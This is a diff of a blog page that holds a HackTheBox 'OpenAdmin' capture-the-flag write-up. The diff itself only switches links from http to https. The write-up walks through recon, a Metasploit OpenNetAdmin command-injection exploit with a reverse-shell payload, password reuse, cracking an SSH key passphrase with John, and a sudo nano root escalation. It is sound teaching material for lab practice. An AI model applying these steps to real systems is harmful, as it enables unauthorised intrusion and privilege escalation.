@@ -20,20 +20,20 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 <meta property="og:description" content="Reconnaissance Let&rsquo;s see what have we got here with nmap.
 nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://ajdintrejic.github.io/posts/htb-openadmin/" />
+<meta property="og:url" content="https://ajdintrejic.github.io/posts/htb-openadmin/" />
 <meta property="article:published_time" content="2020-05-02T09:03:27+02:00" />
 <meta property="article:modified_time" content="2020-05-02T09:03:27+02:00" />
 
 
     
-      <base href="http://ajdintrejic.github.io/posts/htb-openadmin/">
+      <base href="https://ajdintrejic.github.io/posts/htb-openadmin/">
     
     <title>
   HackTheBox :: Openadmin Write Up · ajdintrejic
 </title>
 
     
-      <link rel="canonical" href="http://ajdintrejic.github.io/posts/htb-openadmin/">
+      <link rel="canonical" href="https://ajdintrejic.github.io/posts/htb-openadmin/">
     
 
     <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
@@ -43,7 +43,7 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
     
       
       
-      <link rel="stylesheet" href="http://ajdintrejic.github.io/css/coder.min.8ca1e620659915ffe2eb0a01ebc407d0da2d96ce00f1eb885d93612840044b64.css" integrity="sha256-jKHmIGWZFf/i6woB68QH0Notls4A8euIXZNhKEAES2Q=" crossorigin="anonymous" media="screen" />
+      <link rel="stylesheet" href="https://ajdintrejic.github.io/css/coder.min.8ca1e620659915ffe2eb0a01ebc407d0da2d96ce00f1eb885d93612840044b64.css" integrity="sha256-jKHmIGWZFf/i6woB68QH0Notls4A8euIXZNhKEAES2Q=" crossorigin="anonymous" media="screen" />
     
 
     
@@ -54,8 +54,8 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 
     
 
-    <link rel="icon" type="image/png" href="http://ajdintrejic.github.io/images/favicon-32x32.png" sizes="32x32">
-    <link rel="icon" type="image/png" href="http://ajdintrejic.github.io/images/favicon-16x16.png" sizes="16x16">
+    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-16x16.png" sizes="16x16">
 
     <meta name="generator" content="Hugo 0.73.0" />
   </head>
@@ -66,7 +66,7 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
     <main class="wrapper">
       <nav class="navigation">
   <section class="container">
-    <a class="navigation-title" href="http://ajdintrejic.github.io/">
+    <a class="navigation-title" href="https://ajdintrejic.github.io/">
       ajdintrejic
     </a>
     
@@ -76,15 +76,15 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
       
         
           <li class="navigation-item">
-            <a class="navigation-link" href="http://ajdintrejic.github.io/about/">About</a>
+            <a class="navigation-link" href="https://ajdintrejic.github.io/about/">About</a>
           </li>
         
           <li class="navigation-item">
-            <a class="navigation-link" href="http://ajdintrejic.github.io/posts/">Blog</a>
+            <a class="navigation-link" href="https://ajdintrejic.github.io/posts/">Blog</a>
           </li>
         
           <li class="navigation-item">
-            <a class="navigation-link" href="http://ajdintrejic.github.io/cv/">CV</a>
+            <a class="navigation-link" href="https://ajdintrejic.github.io/cv/">CV</a>
           </li>
         
       
@@ -121,7 +121,7 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 
       <div>
         
-          <img src='http://ajdintrejic.github.io/htb-openadmin/info_card.png' alt="Featured image"/>
+          <img src='https://ajdintrejic.github.io/htb-openadmin/info_card.png' alt="Featured image"/>
         
 
 	
@@ -159,22 +159,22 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 </code></pre></div><p>Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
 </code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-p-: scans from port 1 to 65535, same as -p1-65535
-</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
+</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
 <p>Let&rsquo;s look at the http server.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/http_server.png" alt="http server"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/http_server.png" alt="http server"></p>
 <p>The page has the default Apache 2 page, so let&rsquo;s fire up gobuster. </p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#40a070">100</span>
 </code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-w: use a wordlist
 -u: target url
 -x: search for extensions
 -t: number of threads to run
-</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-openadmin/gobuster.png" alt="gobuster"></p>
+</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/gobuster.png" alt="gobuster"></p>
 <h2 id="owning-user">Owning user</h2>
 <p>Gobuster found /music, if we take a look we can find a reference to 10.10.10.171/ona. This could also be achieved with dirbuster as it can parse html and search for other links. Gobuster doesn&rsquo;t offer this functionality but it&rsquo;s much faster. Let&rsquo;s enum /ona.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/ona.png" alt="ona"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/ona.png" alt="ona"></p>
 <p>Looks like some sort of a admin panel. Lets inspect further, we see it&rsquo;s running OpenNetAdmin version 18.1.1, and we can see it&rsquo;s not the latest version. We can run searchsploit for exploits for OpenNetAdmin.</p>
 <h3 id="exploiting-opennetadmin-with-command-injection-exploit">Exploiting OpenNetAdmin with command injection exploit</h3>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/searchsploit.png" alt="searchsploit"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/searchsploit.png" alt="searchsploit"></p>
 <p>So we have a exploit for the exact version which this server is running. We can copy <code>47772.rb</code> into Metasploit. If you&rsquo;re importing exploits into Metasploit you should run <code>reload_all</code> in msfconsole after <code>cp</code> the package.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
 </code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
@@ -183,45 +183,45 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 <span style="color:#007020">set</span> rhost 10.10.10.171
 <span style="color:#007020">set</span> payload linux/x64/shell_reverse_tcp
 </code></pre></div><p>After using this payload we get a shell as www-data. You can see who you are with <code>whoami</code>.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/www_data_shell.png" alt="www data shell"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/www_data_shell.png" alt="www data shell"></p>
 <h3 id="privilege-escalation-with-db-password">Privilege escalation with db password</h3>
 <p>Now we need to escalate privileges. Let&rsquo;s see who is using this machine.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/users.png" alt="users"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/users.png" alt="users"></p>
 <p>We have Jimmy and Joanna. Let&rsquo;s enumerate the directory we are thrown in. You have to chech every folder from here. The key to escalating privileges is finding the <code>./local/config</code> folder. We have a file with clear text password for the database.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/db_passwords.png" alt="database password"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/db_passwords.png" alt="database password"></p>
 <p>Now we can assume one of the users was sloppy and used the same password for their account. Let&rsquo;s to to ssh into one of them.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/jimmy_ssh.png" alt="ssh"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/jimmy_ssh.png" alt="ssh"></p>
 <p>So we can ssh into Jimmy but it doesn&rsquo;t contain the user.txt, so joanna is the user which we have to own. Now this is a bit tricky. We have to enumerate again. Directory <code>/var/www</code> seems like a server of some sort.</p>
 <h3 id="wierd-server-on-localhost">Wierd server on localhost</h3>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/main_php.png" alt="main php"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/main_php.png" alt="main php"></p>
 <p>So if we can access the server it will output us the ssh private key for joanna. Amazing, but how do we access that? Let&rsquo;s run netstat</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
 </code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-l: listening connections
 -t: TCP connections
-</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-openadmin/n2.png" alt="netstat"></p>
+</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/n2.png" alt="netstat"></p>
 <p>So we have an unusual port 52846 listening on localhost. We can curl from ssh as we can&rsquo;t access this from the browser. </p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl localhost:52846
-</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-openadmin/curl_1.png" alt="curl"></p>
+</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/curl_1.png" alt="curl"></p>
 <p>We&rsquo;ve got a webpage, let&rsquo;s access that main.php file from before.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/curl_2.png" alt="curl"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/curl_2.png" alt="curl"></p>
 <h3 id="cracking-the-hash-with-john">Cracking the hash with John</h3>
 <p>Now we have the <code>id_rsa</code> key for joanna we have to decrypt it, so we can get the password for the private key. Copy the key on your machine and save it as <code>id_rsa</code>, and copy the <code>ssh2john</code> script so we can use john on this key.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
 </code></pre></div><p>Pipe the output to a file:</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ ./ssh2john.py id_rsa &gt; hash.txt
-</code></pre></div><p><img src="http://ajdintrejic.github.io/htb-openadmin/john.png" alt="john"></p>
+</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/john.png" alt="john"></p>
 <p>We have the password. <code>bloodninjas</code>, now let&rsquo;s connect as Joanna.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/ssh_joanna.png" alt="ssh Joanna"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/ssh_joanna.png" alt="ssh Joanna"></p>
 <p>from here we can cat <code>user.txt</code> and we have got the user flag.</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
 c9b2c...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is fairly easy. Each time you log into an user, try running <code>sudo -l</code> so you can see if something can be ran as root, and exploited to gain a shell. Luckily we do have a command we can run as root.</p>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/sudo_l.png" alt="sudo l"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/sudo_l.png" alt="sudo l"></p>
 <p>If you encounter any command that can be ran as root you should check out GTFOBins. They can help you break out of an environment. Now run the above mentioned command as root, and get a shell as root.
 (note: you can also use the file read GTFOBin)</p>
 <h3 id="privilege-escalation-with-nano">Privilege escalation with Nano</h3>
-<p><img src="http://ajdintrejic.github.io/htb-openadmin/nano.png" alt="nano"></p>
+<p><img src="https://ajdintrejic.github.io/htb-openadmin/nano.png" alt="nano"></p>
 <p>You might get confused as the first few commands will overwrite nano&rsquo;s interface but just navigate to root.txt</p>
 <div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
 root
